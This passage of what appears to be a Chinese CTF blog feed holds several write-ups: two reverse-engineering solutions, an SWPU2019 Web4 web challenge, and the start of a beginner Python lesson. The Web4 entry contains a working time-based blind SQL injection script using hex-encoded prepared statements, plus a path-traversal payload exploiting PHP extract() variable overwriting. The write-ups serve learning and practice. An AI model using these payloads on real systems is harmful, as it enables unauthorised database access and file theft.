<p>由于IDA是反编译C语言，s=0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f应该逆序成s = 0x7F666F6067756369LL作为小端储存，关于大小端推荐师傅的**<a href="https://blog.csdn.net/iteye_21199/article/details/82205638?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control">文章</a>**</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += s</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/07/GXYCTF2019-luck-guy/7.png" alt="7"></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">GXY&#123;do_not_hate_me&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>RE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>有关逆序的脚本构建</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU2019 Web4</title>
    <url>/2021/04/14/SWPU2019-Web4/</url>
    <content><![CDATA[<p>无论URL还是界面都很有SQL的feeling,，点击注册，发现无法提供注册，使用密码本爆破也失败（应该有过滤）</p>
<p><img src="/2021/04/14/SWPU2019-Web4/0.png" alt="0"></p>
<h2 id="0x01-抓包"><strong>0x01 抓包</strong></h2>
<ul>
<li><strong>我们账号和密码都输入admin,开始发包和抓包</strong></li>
</ul>
<p><img src="/2021/04/14/SWPU2019-Web4/1.png" alt="1"></p>
<p>界面很容易让人想起SQL注入，由于登陆没反应，我们直接抓包，因为之前堆叠注入做过几道题（<a href="https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL">buuctf 极客大挑战</a>），还是比较熟悉判断方法</p>
<p><strong><code>存在堆叠注入的判断方法</code></strong> :  <strong>名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。</strong></p>
<p>根据判断方法，当我们在 <strong><code>username</code></strong>  输入 <strong><code>admin'</code></strong>  或者 <strong><code>admin;'</code></strong>  ，提示报错</p>
<p><img src="/2021/04/14/SWPU2019-Web4/2.png" alt="2"></p>
<p>当我们在 <strong><code>username</code></strong>  输入：<strong><code>admin</code></strong>  或者 <strong><code>admin’;</code></strong>  报错消失</p>
<p>我们先引来引入php中的PDO知识点</p>
<hr>
<h2 id="0x02-先来讲一下什么是PDO"><strong>0x02 先来讲一下什么是PDO</strong></h2>
<p><a href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>
<p><a href="https://www.runoob.com/php/php-pdo.html">https://www.runoob.com/php/php-pdo.html</a></p>
<p>默认是pdo对象的query语句是能执行有;参与的多语句执行的，那我们就能闭合前面的单引号后进行堆叠注入。</p>
<hr>
<h2 id="0x03-由于我们没收到特殊回显和被过滤掉了许多关键字。我们构造的脚本考虑采用十六进制加预处理加上时间盲注进行绕过"><strong>0x03 由于我们没收到特殊回显和被过滤掉了许多关键字。我们构造的脚本考虑采用十六进制加预处理加上时间盲注进行绕过</strong></h2>
<ul>
<li><strong>为什么用十六进制SQL预处理语句+时间盲注来绕过</strong></li>
</ul>
<p>因为SQL关键字被绕过而且回显并不特别的情况下再加上某些单词如 <code>select,if.sleep</code> 必须使用，盲注考虑后觉得时间盲注可能性比较大</p>
<ul>
<li><strong>时间盲注思路</strong></li>
</ul>
<p><strong><code>select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(5),1)</code></strong>  ，<code>&#123;0&#125;</code> 猜测字段的长度 ， <code>&#123;1&#125;</code> 是32-128的ascii数值（用来盲注爆破）</p>
<ul>
<li>
<p><strong>防止SQL预处理被过滤</strong></p>
<p>使用16进制</p>
</li>
</ul>
<p>如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> hex(<span class="string">&#x27;select sleep(5)&#x27;</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656C65637420736C656570283529</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">prepare</span> test <span class="keyword">from</span> <span class="variable">@a</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">execute</span> test;</span><br></pre></td></tr></table></figure>
<p><strong><code>select sleep(5) </code></strong> 语句可以让mysql服务休息5秒。这里这四句相当于执行了该语句，从而绕过上传被过滤的字符串。</p>
<p>在SQL测试中发现确实可以执行</p>
<p>​</p>
<p><strong>通过mysql预处理与hex绕过过滤来过滤脚本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#author: c1e4r</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn/index.php?r=Login/Index&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">&quot;admin&#x27;;set @a=0x&#123;0&#125;;prepare b from @a;execute b--+&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>下载获得的源码 <strong><code>URL+glzjin_wants_a_girl_friend.zip</code></strong></p>
<hr>
<h2 id="0x04开始对源码进行代码审计"><strong>0x04开始对源码进行代码审计</strong></h2>
<p>前端应用逻辑的基础在 <code>controller</code> 文件夹下面，而其他文件都是基于 <code>basecontroller.php</code> 所以我们打开  <code>basecontroller.php</code> 文件进行代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">private</span> <span class="variable">$viewPath</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params"><span class="variable">$viewName</span> =<span class="string">&#x27;&#x27;</span>, <span class="variable">$viewData</span> = []</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			extract(<span class="variable">$viewData</span>);</span><br><span class="line">			<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong><code>extract</code></strong> 传入 <strong><code>viewdata</code></strong>  数组造成变量覆盖，发现利用 <strong><code>loadView</code></strong> 方法的并且第二个元素可控的地方只有    <strong><code>UserController.php</code></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$listData</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadView(<span class="string">&#x27;userIndex&#x27;</span>,<span class="variable">$listData</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在Controller/UserController.php中，找到可控制的参数$listData,直接来源于$_REQUEST。  由于  <strong><code>$listData = $_REQUEST;</code></strong>  可以控制  到 <strong><code>userIndex.php</code></strong> 文件看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;fakeimg&quot;&gt;&lt;?php</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$img_file</span>)) &#123;</span><br><span class="line">        <span class="variable">$img_file</span> = <span class="string">&#x27;/../favicon.ico&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$img_dir</span> = dirname(<span class="keyword">__FILE__</span>) . <span class="variable">$img_file</span>;</span><br><span class="line">    <span class="variable">$img_base64</span> = imgToBase64(<span class="variable">$img_dir</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$img_base64</span> . <span class="string">&#x27;&quot;&gt;&#x27;</span>;       <span class="comment">//图片形式展示</span></span><br><span class="line">    <span class="meta">?&gt;</span>&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>这里的$img_file的值可利用前面的逻辑进行覆盖，传入img_file=./…/flag.php即可，而又因为下面的路由控制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路由控制跳转至控制器</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$r</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line">	<span class="keyword">list</span>(<span class="variable">$controller</span>,<span class="variable">$action</span>) = <span class="variable">$r</span>;</span><br><span class="line">	<span class="variable">$controller</span> = <span class="string">&quot;<span class="subst">&#123;$controller&#125;</span>Controller&quot;</span>;</span><br><span class="line">	<span class="variable">$action</span> = <span class="string">&quot;action<span class="subst">&#123;$action&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(class_exists(<span class="variable">$controller</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(method_exists(<span class="variable">$controller</span>,<span class="variable">$action</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$action</span> = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$controller</span> = <span class="string">&quot;LoginController&quot;</span>;</span><br><span class="line">        <span class="variable">$action</span> = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$data</span> = call_user_func(<span class="keyword">array</span>( (<span class="keyword">new</span> <span class="variable">$controller</span>), <span class="variable">$action</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location:index.php?r=Login/Index&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面可以知道我们传入的路由 <strong><code>r-User/Index</code></strong></p>
<hr>
<h2 id="0x05-我们构造playload"><strong>0x05 我们构造playload</strong></h2>
<p>GET: <strong><code>index.php?r=User/Index</code></strong></p>
<p>POST: <strong><code>img_file=/../flag.php</code></strong></p>
<p><img src="/2021/04/14/SWPU2019-Web4/5.png" alt="5"></p>
<p><img src="/2021/04/14/SWPU2019-Web4/4.png" alt="4"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;68b619e4-47d7-4e76-b823-26dd0e110c68&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>堆叠注入</tag>
        <tag>代码审计</tag>
        <tag>SQL注入</tag>
        <tag>16进制SQL预处理过滤</tag>
        <tag>时间盲注</tag>
        <tag>16进制SQL预处理过滤和时间盲注构建python脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-SimpleRev</title>
    <url>/2021/04/10/buuctf-SimpleRev/</url>
    <content><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/15ojPMVsasx3EZ9s5wVQqEw">https://pan.baidu.com/s/15ojPMVsasx3EZ9s5wVQqEw</a><br>
提取码：icjp</p>
<h2 id="0x01-使用EFPE查看文件"><strong>0x01 使用EFPE查看文件</strong></h2>
<p><img src="/2021/04/10/buuctf-SimpleRev/1.png" alt="1"></p>
<p>没有加壳，64位文件</p>
<h2 id="0x02-使用IDA打开文件，查看main函数，F5反编译"><strong>0x02 使用IDA打开文件，查看main函数，F5反编译</strong></h2>
<p><img src="/2021/04/10/buuctf-SimpleRev/3.png" alt="3"></p>
<h2 id="0x03-查看-Decry-函数"><strong>0x03 查看</strong> <em>Decry()函数</em></h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">Decry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+Fh] [bp-51h]@19</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+10h] [bp-50h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [sp+14h] [bp-4Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+18h] [bp-48h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-44h]@1</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [sp+20h] [bp-40h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+28h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+30h] [bp-30h]@1</span></span><br><span class="line">  __int64 v10; <span class="comment">// [sp+40h] [bp-20h]@1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+48h] [bp-18h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+50h] [bp-10h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+58h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v13 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  *(_QWORD *)src = <span class="number">357761762382LL</span>;  <span class="comment">//选中之后H键转换16进制为0x534C43444ELL，数据在内存中是小端顺序，高位在高地址处，低位在低地址处，故实际的字符顺序应为&#x27;0x4e44434c53&#x27;经过16字符转换为ASCII码转换后字符为&#x27;NDCLS&#x27;</span></span><br><span class="line">　　　　　　　　　　　　　　　　　　　　　　</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">512969957736LL</span>; <span class="comment">//同上，转换后查询Ascii码为&quot;wodah&quot;</span></span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v0) = join(key3, &amp;v10); <span class="comment">//在main页面v3=&#x27;kills&#x27;,v10=’wodah‘,这个函数就是把v3和v10两个字符串相拼接&#x27;killshadow&#x27;</span></span><br><span class="line">  text = v0;</span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);  <span class="comment">//strcpy函数就是让key1的值（&#x27;ADSFK&#x27;）赋予key</span></span><br><span class="line">  <span class="built_in">strcat</span>(key, src);  <span class="comment">//strcat函数就是让src的值拼接到key后面也就是&#x27;ADSFKNDCLS&#x27;</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  getchar(); <span class="comment">//清空缓冲区</span></span><br><span class="line">  v6 = <span class="built_in">strlen</span>(key); <span class="comment">//v6的长度等于key,v6=10</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v4 % v6] &gt; <span class="number">64</span> &amp;&amp; key[v4 % v6] &lt;= <span class="number">90</span> ) <span class="comment">//将大写字母转换为小写字母</span></span><br><span class="line">      key[i] = key[v4 % v6] + <span class="number">32</span>;                  <span class="comment">//’adsfkndcls‘</span></span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>, src);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt;= <span class="number">96</span> || v2 &gt; <span class="number">122</span> )     <span class="comment">//如果输入的v2不是小写字母</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">64</span> &amp;&amp; v2 &lt;= <span class="number">90</span> )   <span class="comment">//如果v2为大写字母</span></span><br><span class="line">          str2[v3] = (v2 - <span class="number">39</span> - key[v4++ % v6] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;  <span class="comment">//对srt[v3]进行处理（v3为0每次加1）//// str1[v3] = (v2-key[v4]+58)%26 + 97//变换后str2[v3]存放小写字母</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v3] = (v2 - <span class="number">39</span> - key[v4++ % v6] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">//同样处理</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v4 % v6) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )         <span class="comment">//如果text和存储的str2相同，就成功·</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);       <span class="comment">//text = &quot;&quot;killshadow&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析代码以及相应的值，我们已经可以知道text以及key的值，剩下就是str2，str2就是我们想要的flag</p>
<p>得到flag的条件关键在于式子<strong>str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97</strong></p>
<h2 id="0x04-构造playload爆破"><strong>0x04 构造playload爆破</strong></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&#x27;killswodah&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;adsfkslcdn&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">ord</span>(text[i]) == (j - <span class="number">39</span> - <span class="built_in">ord</span>(key[i % <span class="number">10</span>]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>:</span><br><span class="line">             flag += <span class="built_in">chr</span>(j)</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>flag{KLDQCOZFDU}</p>
]]></content>
      <categories>
        <category>RE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>python构造脚本爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始学python</title>
    <url>/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/</url>
    <content><![CDATA[<blockquote>
<p>从零考试学习python内容 99%来自于python大神 python-jack的<a href="https://zhuanlan.zhihu.com/p/113640664">知乎文章  </a> 再结合本人的实际情况进行学习，严格来说这是JACK老师的内容，只不过再此基础上，我增添了一些我在CTF解题过程中遇到的python脚本实际情况，再次感谢JACK老师</p>
<p>学习的内容来自：<a href="https://zhuanlan.zhihu.com/p/113640664">https://zhuanlan.zhihu.com/p/113640664</a></p>
</blockquote>
<h2 id="从零开始学Python-第003课：Python语言元素之变量"><strong>从零开始学Python - 第003课：Python语言元素之变量</strong></h2>
<ul>
<li>整型（int）：Python中可以处理任意大小的整数，而且支持二进制（如<code>0b100</code>，换算成十进制是4）、八进制（如<code>0o100</code>，换算成十进制是64）、十进制（<code>100</code>）和十六进制（<code>0x100</code>，换算成十进制是256）的表示法。</li>
</ul>
<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/0.png" alt="0"></p>
<ul>
<li>浮点型（float）：浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，浮点数除了数学写法（如<code>123.456</code>）之外还支持科学计数法（如<code>1.23456e2</code>）。</li>
<li><strong>字符串型（str）：字符串是以单引号或双引号括起来的任意文本，比如<code>'hello'</code>和<code>&quot;hello&quot;</code>。</strong></li>
<li>布尔型（bool）：布尔值只有<code>True</code>、<code>False</code>两种值，要么是<code>True</code>，要么是<code>False</code>。</li>
</ul>
<hr>
<h3 id="变量命名">变量命名</h3>
<p>对于每个变量我们需要给它取一个名字，就如同我们每个人都有自己的名字一样。在Python中，变量命名需要遵循以下这些规则，这些规则又分为必须遵守的硬性规则和建议遵守的非硬性规则。</p>
<h4 id="硬性规则：">硬性规则：</h4>
<ol>
<li>变量名由<strong>字母</strong>、数字和<strong>下划线</strong>构成，数字不能开头。需要说明的是，这里说的字母指的是Unicode字符，Unicode称为万国码，囊括了世界上大部分的文字系统，这也就意味着中文、日文、希腊字母等都可以作为变量名中的字符，但是像<code>!</code>、<code>@</code>、<code>#</code>这些特殊字符是不能出现在变量名中的，而且我们强烈建议大家<strong>尽可能使用英文字母</strong>。</li>
<li><strong>大小写敏感</strong>，简单的说就是大写的<code>A</code>和小写的<code>a</code>是两个不同的变量。</li>
<li>变量名<strong>不要跟Python语言的关键字</strong>（有特殊含义的单词，后面会讲到）和<strong>保留字</strong>（如函数、模块等的名字）<strong>发生重名的冲突</strong>。</li>
</ol>
<hr>
<h4 id="非硬性规则：">非硬性规则：</h4>
<ol>
<li>变量名通常使用小写英文字母，多个单词用下划线进行连接。</li>
<li>受保护的变量用单个下划线开头（后面会讲到）。</li>
<li>私有的变量用两个下划线开头（后面会讲到）。</li>
</ol>
<hr>
<p>在Python中可以使用<code>type</code>函数对变量的类型进行检查。程序设计中函数的概念跟数学上函数的概念是一致的，数学上的函数相信大家并不陌生，它包括了函数名、自变量和因变量。如果暂时不理解这个概念也不要紧，我们会在后续的内容中专门讲解函数的定义和使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">使用type()检查变量的类型</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">100</span></span><br><span class="line">b = <span class="number">12.345</span></span><br><span class="line">c = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line">d = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))    <span class="comment"># &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b))    <span class="comment"># &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c))    <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(d))    <span class="comment"># &lt;class &#x27;bool&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/1.png" alt="1"></p>
<p>不同类型的变量可以相互转换，这一点可以通过Python的内置函数来实现。</p>
<ul>
<li>
<p><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</p>
</li>
<li>
<p><code>float()</code>：将一个字符串转换成浮点数。</p>
</li>
<li>
<p><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</p>
</li>
<li>
<pre><code class="language-python">&gt;&gt;&gt; ord('A')
65
&gt;&gt;&gt; chr(66)
'B'
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- &#96;chr()&#96;：将整数转换成该编码对应的字符串（一个字符）。</span><br><span class="line"></span><br><span class="line">- &#96;ord()&#96;：将字符串（一个字符）转换成对应的编码（整数）。</span><br><span class="line"></span><br><span class="line">下面的例子为大家演示了Python中的类型转换。</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Python中的类型转换</span><br><span class="line"></span><br><span class="line">Version: 0.1</span><br><span class="line">Author: 骆昊</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">a &#x3D; 100</span><br><span class="line">b &#x3D; 12.345</span><br><span class="line">c &#x3D; &#39;hello, world&#39;</span><br><span class="line">d &#x3D; True</span><br><span class="line"># 整数转成浮点数</span><br><span class="line">print(float(a))    # 100.0</span><br><span class="line"># 浮点型转成字符串 (输出字符串时不会看到引号哟)</span><br><span class="line">print(str(b))      # 12.345</span><br><span class="line"># 字符串转成布尔型 (有内容的字符串都会变成True)</span><br><span class="line">print(bool(c))     # True</span><br><span class="line"># 布尔型转成整数 (True会转成1，False会转成0)</span><br><span class="line">print(int(d))      # 1</span><br><span class="line"># 将整数变成对应的字符 (97刚好对应字符表中的字母a)</span><br><span class="line">print(chr(97))     # a</span><br><span class="line"># 将字符转成整数 (Python中字符和字符串表示法相同)</span><br><span class="line">print(ord(&#39;a&#39;))    # 97</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
